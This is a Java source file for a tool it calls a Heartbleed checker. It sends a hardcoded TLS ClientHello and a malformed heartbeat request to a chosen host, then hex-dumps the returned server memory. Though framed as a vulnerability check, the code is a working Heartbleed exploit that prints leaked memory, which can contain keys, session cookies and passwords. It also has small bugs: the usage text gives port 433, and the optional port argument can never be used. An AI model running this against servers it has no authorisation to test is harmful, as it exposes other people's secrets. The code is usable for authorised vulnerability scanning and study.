/*
 * The MIT License
 *
 * Copyright 2014 pot8os.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package net.pot8os.heartbleedchecker;

/**
 *
 * @author pot8os
 */
public class Main {

    private static final byte[] CLIENT_HELLO = HexUtil.hex2bin("16 03 02 00 DC 01 00 00 D8 03 02 53"
            + "43 5B 90 9D 9B 72 0B BC 0C BC 2B 92 A8 48 97 CF"
            + "BD 39 04 CC 16 0A 85 03 90 9F 77 04 33 D4 DE 00"
            + "00 66 C0 14 C0 0A C0 22 C0 21 00 39 00 38 00 88"
            + "00 87 C0 0F C0 05 00 35 00 84 C0 12 C0 08 C0 1C"
            + "C0 1B 00 16 00 13 C0 0D C0 03 00 0A C0 13 C0 09"
            + "C0 1F C0 1E 00 33 00 32 00 9A 00 99 00 45 00 44"
            + "C0 0E C0 04 00 2F 00 96 00 41 C0 11 C0 07 C0 0C"
            + "C0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11"
            + "00 08 00 06 00 03 00 FF 01 00 00 49 00 0B 00 04"
            + "03 00 01 02 00 0A 00 34 00 32 00 0E 00 0D 00 19"
            + "00 0B 00 0C 00 18 00 09 00 0A 00 16 00 17 00 08"
            + "00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13"
            + "00 01 00 02 00 03 00 0F 00 10 00 11 00 23 00 00"
            + "00 0F 00 01 01");

    private static final byte[] HEARTBEAT = HexUtil.hex2bin("18 03 02 00 03 01 40 00");

    public static void main(String... args) throws Exception {
        if (args.length != 1) {
            System.err.println("usage: java -jar HeartBleedChecker.jar <hostname> <port:default=433>");
            return;
        }
        final String host = args[0];
        String port = "443";
        if (args.length == 2 && args[1].matches("[0-9]+")) {
            port = args[1];
        }
        System.out.println("Target: " + host + ":" + port);
        LowSocketImpl socket = new LowSocketImpl(host, Integer.valueOf(port));
        System.out.println(" Sending Client Hello...");
        socket.write(CLIENT_HELLO).flush();
        String res = HexUtil.printBytes(socket.getResponse());
        if (res == null || !res.endsWith("0E000000")) {
            System.err.println("Invalid Server Hello.");
            return;
        }
        System.out.println(" Received Server Hello.");
        System.out.println(" Sending Heartbeat...");
        socket.write(HEARTBEAT).flush();
        byte[] response = socket.getResponse();
        if (response.length < 6) {
            System.out.println("No Heartbeat messages.");
        } else {
            byte[] heartbeatResponse = new byte[response.length - 5];
            for (int i = 0; i < heartbeatResponse.length; i++) {
                heartbeatResponse[i] = response[i + 5];
            }
            HexUtil.dump(heartbeatResponse);
            if (response.length <= 7) {
                System.out.println(host + " is safe.");
            } else {
                System.err.println(host + " is vulnerable!");
            }
        }
        socket.close();
    }
}
